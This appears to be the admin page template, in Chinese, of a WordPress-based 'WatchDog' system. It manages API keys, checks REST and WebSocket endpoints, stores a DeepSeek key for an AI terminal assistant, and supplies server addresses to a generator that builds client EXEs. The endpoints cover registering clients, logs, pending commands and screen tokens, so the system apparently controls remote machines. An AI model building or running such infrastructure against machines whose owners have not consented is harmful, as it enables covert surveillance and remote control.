<?php
defined('ABSPATH') || exit;
include WD_THEME_DIR . '/templates/partials/layout-open.php';
?>

<div class="wd-page">
  <div class="wd-page-header">
    <h1 class="wd-page-title">API Key 管理</h1>
    <div class="wd-header-right">
      <button class="wd-btn wd-btn--info" onclick="openModal('config-info-modal');checkConfigStatus()">📋 接口配置</button>
      <button class="wd-btn wd-btn--ghost" onclick="openModal('health-modal')">⚡ 接口自检</button>
      <button class="wd-btn wd-btn--primary" onclick="openModal('create-key-modal')">+ 创建 API Key</button>
    </div>
  </div>

  <div class="wd-card">
    <div class="wd-card-body wd-p0">
      <table class="wd-table wd-table--hover">
        <thead><tr><th>名称</th><th>分类</th><th>API Key</th><th>状态</th><th>创建时间</th><th>操作</th></tr></thead>
        <tbody id="key-tbody"><tr><td colspan="6" class="wd-center wd-muted">加载中...</td></tr></tbody>
      </table>
    </div>
  </div>

  <!-- DeepSeek AI 助手配置 -->
  <div class="wd-card" style="margin-top:20px">
    <div class="wd-card-header" style="display:flex;align-items:center;gap:10px;padding:14px 18px;border-bottom:1px solid rgba(255,255,255,0.07)">
      <span style="font-size:20px">🤖</span>
      <div>
        <div style="font-weight:600;font-size:14px">AI 终端助手 · DeepSeek 配置</div>
        <div style="font-size:12px;color:#888;margin-top:2px">配置 DeepSeek API Key 后，可在屏幕监控和终端页面使用 AI 助手生成命令</div>
      </div>
    </div>
    <div class="wd-card-body" style="padding:16px 18px">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
        <div style="flex:1;min-width:240px">
          <label style="font-size:12px;color:#888;display:block;margin-bottom:5px">DeepSeek API Key</label>
          <input id="deepseek-key-input" type="password" class="wd-input"
                 style="width:100%;font-family:monospace"
                 placeholder="sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" autocomplete="off"/>
        </div>
        <div style="flex-shrink:0;padding-top:18px">
          <button id="deepseek-save-btn" class="wd-btn wd-btn--primary" onclick="saveDeepSeekKey()">保存 Key</button>
        </div>
      </div>
      <div style="margin-top:10px;font-size:12px;color:#666">
        当前已保存：<code id="deepseek-key-display" style="color:#4e9af1;background:rgba(78,154,241,0.1);padding:2px 6px;border-radius:3px">未配置</code>
        &nbsp;·&nbsp;
        <a href="https://platform.deepseek.com/api_keys" target="_blank" style="color:#4e9af1">在 DeepSeek 平台申请 Key →</a>
      </div>
    </div>
  </div>
</div>

<!-- 接口配置信息弹窗 -->
<div class="wd-modal" id="config-info-modal" style="display:none">
  <div class="wd-modal-backdrop" onclick="closeModal('config-info-modal')"></div>
  <div class="wd-modal-dialog wd-modal-dialog--lg">
    <div class="wd-modal-header"><h3>📋 接口配置信息</h3><button class="wd-modal-close" onclick="closeModal('config-info-modal')">✕</button></div>
    <div class="wd-modal-body">
      <p class="wd-sm wd-muted" style="margin-bottom:14px">将以下参数填入 WatchDog Generator（客户端生成器）完成配置。</p>
      <div id="config-info-tbody"></div>
      <div class="wd-info-box" style="margin-top:14px">
        <strong>使用方式：</strong>打开 WatchDog Generator → 服务器配置，填入 REST API 地址、一个有效的 API Key 和 WebSocket 地址，然后点击「保存配置」再构建客户端 EXE。
      </div>
    </div>
    <div class="wd-modal-footer">
      <button class="wd-btn wd-btn--ghost" onclick="closeModal('config-info-modal')">关闭</button>
      <button class="wd-btn wd-btn--primary" onclick="checkConfigStatus()">重新检测</button>
    </div>
  </div>
</div>

<!-- 接口自检弹窗 -->
<div class="wd-modal" id="health-modal" style="display:none">
  <div class="wd-modal-backdrop" onclick="closeModal('health-modal')"></div>
  <div class="wd-modal-dialog wd-modal-dialog--lg">
    <div class="wd-modal-header"><h3>⚡ 接口自检</h3><button class="wd-modal-close" onclick="closeModal('health-modal')">✕</button></div>
    <div class="wd-modal-body"><div id="health-results" class="wd-center wd-muted">点击「开始检测」...</div></div>
    <div class="wd-modal-footer">
      <button class="wd-btn wd-btn--ghost" onclick="closeModal('health-modal')">关闭</button>
      <button class="wd-btn wd-btn--primary" id="health-run-btn" onclick="runHealthCheck()">开始检测</button>
    </div>
  </div>
</div>

<!-- 创建 Key 弹窗 -->
<div class="wd-modal" id="create-key-modal" style="display:none">
  <div class="wd-modal-backdrop" onclick="closeModal('create-key-modal')"></div>
  <div class="wd-modal-dialog">
    <div class="wd-modal-header"><h3>创建 API Key</h3><button class="wd-modal-close" onclick="closeModal('create-key-modal')">✕</button></div>
    <div class="wd-modal-body">
      <div class="wd-form-group"><label class="wd-label">名称 <span class="wd-required">*</span></label><input type="text" class="wd-input" id="new-key-name" placeholder="如：生产环境"></div>
      <div class="wd-form-group"><label class="wd-label">分类</label><input type="text" class="wd-input" id="new-key-cat" placeholder="如：production"></div>
    </div>
    <div class="wd-modal-footer">
      <button class="wd-btn wd-btn--ghost" onclick="closeModal('create-key-modal')">取消</button>
      <button class="wd-btn wd-btn--primary" onclick="createKey()">创建</button>
    </div>
  </div>
</div>

<!-- 显示新 Key 弹窗 -->
<div class="wd-modal" id="show-key-modal" style="display:none">
  <div class="wd-modal-backdrop"></div>
  <div class="wd-modal-dialog">
    <div class="wd-modal-header"><h3>保存您的 API Key</h3></div>
    <div class="wd-modal-body">
      <p class="wd-muted wd-sm">此 Key 只显示一次，请立即复制保存：</p>
      <div class="wd-key-reveal">
        <code id="show-key-val"></code>
        <button class="wd-btn wd-btn--ghost wd-btn--sm" onclick="copyKey()">复制</button>
      </div>
    </div>
    <div class="wd-modal-footer">
      <button class="wd-btn wd-btn--primary" onclick="closeModal('show-key-modal');loadKeys()">我已保存</button>
    </div>
  </div>
</div>

<script>
document.getElementById('wd-topbar-title').textContent = 'API Key 管理';

async function loadKeys() {
    const res = await WD.ajax('wd_list_api_keys', {});
    const tbody = document.getElementById('key-tbody');
    if (!res.success) { tbody.innerHTML = '<tr><td colspan="6" class="wd-center wd-muted">加载失败</td></tr>'; return; }
    const keys = res.data;
    tbody.innerHTML = keys.length ? keys.map(k => `
        <tr class="${k.is_active==0?'wd-disabled':''}">
          <td><strong>${escHtml(k.name)}</strong></td>
          <td><span class="wd-badge">${escHtml(k.category||'—')}</span></td>
          <td class="wd-mono wd-sm">${k.api_key.slice(0,8)}••••${k.api_key.slice(-4)}</td>
          <td><span class="wd-badge wd-badge--${k.is_active?'green':'gray'}">${k.is_active?'启用':'停用'}</span></td>
          <td class="wd-sm wd-muted">${k.created_at}</td>
          <td><div class="wd-actions">
            <button class="wd-btn wd-btn--xs wd-btn--ghost" onclick="toggleKey(${k.id})">${k.is_active?'停用':'启用'}</button>
            <button class="wd-btn wd-btn--xs wd-btn--danger" onclick="WD.confirm('确定删除 Key &quot;${escHtml(k.name)}&quot;？',()=>deleteKey(${k.id}))">删除</button>
          </div></td>
        </tr>`) .join('')
      : '<tr><td colspan="6" class="wd-center wd-muted">暂无 API Key</td></tr>';
}

async function createKey() {
    const name = document.getElementById('new-key-name').value.trim();
    const cat  = document.getElementById('new-key-cat').value.trim();
    if (!name) return WD.toast('名称不能为空','error');
    const res = await WD.ajax('wd_create_api_key', { name, category: cat }, 'POST');
    if (!res.success) return WD.toast(res.data?.message||'创建失败','error');
    closeModal('create-key-modal');
    document.getElementById('show-key-val').textContent = res.data.api_key;
    openModal('show-key-modal');
}
function copyKey() { navigator.clipboard.writeText(document.getElementById('show-key-val').textContent).then(()=>WD.toast('已复制')); }
async function toggleKey(id) { const r = await WD.ajax('wd_toggle_api_key',{id},'POST'); if(r.success) loadKeys(); }
async function deleteKey(id) { const r = await WD.ajax('wd_delete_api_key',{id},'POST'); if(r.success){loadKeys();WD.toast('已删除');} }

window.checkConfigStatus = async function() {
    const el      = document.getElementById('config-info-tbody');
    const restUrl = WD.rest_url || (location.origin + '/wp-json/watchdog/v1/');
    const wsHost  = WD.ws_host || '';
    const wsProto = location.protocol === 'https:' ? 'wss://' : 'ws://';
    const wsBase  = wsHost.replace(/^wss?:\/\//i, '');
    const wsUrl   = wsBase ? wsProto + wsBase : '（未配置 — 请到 KOOK 设置页填写）';

    el.innerHTML = '<p class="wd-center wd-muted">检测中...</p>';

    let restOk = false, restMs = 0;
    try {
        const t0 = Date.now();
        const r = await fetch(restUrl + 'heartbeat', { method:'POST', headers:{'X-WatchDog-Key':'healthcheck','X-WP-Nonce':WD.rest_nonce} });
        restOk = r.status !== 404; restMs = Date.now()-t0;
    } catch(e){}

    let wsOk = null, wsMs = 0;
    if (wsBase) {
        const t0 = Date.now();
        wsOk = await new Promise(resolve => {
            const ws = new WebSocket(wsProto + wsBase + '/ping');
            const timer = setTimeout(() => { ws.close(); resolve(false); }, 3000);
            ws.onopen  = () => { clearTimeout(timer); ws.close(); resolve(true); };
            ws.onerror = () => { clearTimeout(timer); resolve(false); };
        });
        wsMs = Date.now()-t0;
    }

    const rows = [
        { label:'REST API 地址',  sub:'填入生成器「REST API 地址」', value:restUrl,         ok:restOk,       ms:restMs },
        { label:'WebSocket 地址', sub:'填入生成器「WebSocket 地址」', value:wsUrl,           ok:wsOk,         ms:wsMs },
        { label:'站点地址',        sub:'参考',                        value:location.origin, ok:true,         ms:0 },
    ];

    el.innerHTML = `<table class="wd-table"><thead><tr><th>配置项</th><th>当前值</th><th>状态</th><th>操作</th></tr></thead><tbody>
    ${rows.map(r=>{
        const badge = r.ok===null
            ? '<span class="wd-badge wd-badge--gray">未配置</span>'
            : `<span class="wd-badge wd-badge--${r.ok?'green':'red'}">${r.ok?'✓ 正常':'✗ 异常'}</span>`;
        const ms = r.ms ? ` <span class="wd-sm wd-muted">${r.ms}ms</span>` : '';
        return `<tr>
            <td><strong>${escHtml(r.label)}</strong><br><span class="wd-sm wd-muted">${escHtml(r.sub)}</span></td>
            <td class="wd-mono wd-sm" style="word-break:break-all">${escHtml(r.value)}</td>
            <td>${badge}${ms}</td>
            <td><button class="wd-btn wd-btn--xs wd-btn--ghost" onclick="navigator.clipboard.writeText('${escHtml(r.value).replace(/'/g,"\\'")}').then(()=>WD.toast('已复制'))">复制</button></td>
        </tr>`;
    }).join('')}
    </tbody></table>`;
};

window.runHealthCheck = async function() {
    const btn = document.getElementById('health-run-btn');
    btn.disabled = true; btn.textContent = '检测中...';
    const el = document.getElementById('health-results');
    el.innerHTML = '<div class="wd-center wd-muted">正在检测...</div>';

    const restBase = WD.rest_url;
    const wsHost   = WD.ws_host || '';
    const wsProto  = location.protocol === 'https:' ? 'wss://' : 'ws://';
    const wsBase   = wsHost.replace(/^wss?:\/\//i, '');
    const checks = [
        { label: 'REST /register',         url: restBase + 'register',         method: 'POST' },
        { label: 'REST /heartbeat',         url: restBase + 'heartbeat',        method: 'POST' },
        { label: 'REST /logs/batch',        url: restBase + 'logs/batch',       method: 'POST' },
        { label: 'REST /commands/pending',  url: restBase + 'commands/pending', method: 'GET' },
        { label: 'REST /screen/token',      url: restBase + 'screen/token',     method: 'POST' },
    ];
    const rows = await Promise.all(checks.map(async c => {
        const t0 = Date.now();
        try {
            const r = await fetch(c.url, { method: c.method, headers: { 'X-WatchDog-Key': 'healthcheck', 'X-WP-Nonce': WD.rest_nonce } });
            return { label: c.label, ok: r.status !== 404, status: r.status, ms: Date.now()-t0 };
        } catch(e) { return { label: c.label, ok: false, status: 'ERR', ms: Date.now()-t0 }; }
    }));

    let wsResult = { label: 'WebSocket 中继', ok: false, status: wsBase ? '连接失败' : '未配置', ms: 0 };
    if (wsBase) {
        const t0 = Date.now();
        await new Promise(resolve => {
            const ws = new WebSocket(wsProto + wsBase + '/ping');
            const timer = setTimeout(() => { ws.close(); wsResult.status = '超时'; resolve(); }, 3000);
            ws.onopen  = () => { wsResult.ok=true; wsResult.status=200; wsResult.ms=Date.now()-t0; clearTimeout(timer); ws.close(); resolve(); };
            ws.onerror = () => { wsResult.ms=Date.now()-t0; clearTimeout(timer); resolve(); };
        });
    }
    rows.push(wsResult);

    el.innerHTML = `<table class="wd-table"><thead><tr><th>接口</th><th>状态</th><th>HTTP 码</th><th>延迟</th></tr></thead><tbody>
        ${rows.map(r=>`<tr>
            <td class="wd-mono wd-sm">${escHtml(r.label)}</td>
            <td><span class="wd-badge wd-badge--${r.ok?'green':'red'}">${r.ok?'✓ 正常':'✗ 异常'}</span></td>
            <td class="wd-mono">${r.status}</td>
            <td class="wd-sm wd-muted">${r.ms}ms</td>
        </tr>`).join('')}
    </tbody></table>
    <p class="wd-sm wd-muted" style="margin-top:8px">401/403 = 端点存在（正常），404 = 未注册</p>`;
    btn.disabled = false; btn.textContent = '重新检测';
};

loadKeys();

// ── DeepSeek AI Key ───────────────────────────────────────
(async function() {
    const res = await WD.ajax('wd_get_ai_key');
    if (res.success && res.data.masked) {
        document.getElementById('deepseek-key-display').textContent = res.data.masked;
    }
})();

window.saveDeepSeekKey = async function() {
    const key = document.getElementById('deepseek-key-input').value.trim();
    if (!key) return WD.toast('请输入 API Key', 'error');
    const btn = document.getElementById('deepseek-save-btn');
    btn.disabled = true;
    const res = await WD.ajax('wd_save_ai_key', { api_key: key }, 'POST');
    btn.disabled = false;
    if (res.success) {
        WD.toast('DeepSeek API Key 已保存', 'success');
        document.getElementById('deepseek-key-display').textContent = key.substring(0, 6) + '...';
        document.getElementById('deepseek-key-input').value = '';
    } else {
        WD.toast(res.data?.message || '保存失败', 'error');
    }
};
</script>

<?php include WD_THEME_DIR . '/templates/partials/layout-close.php'; ?>
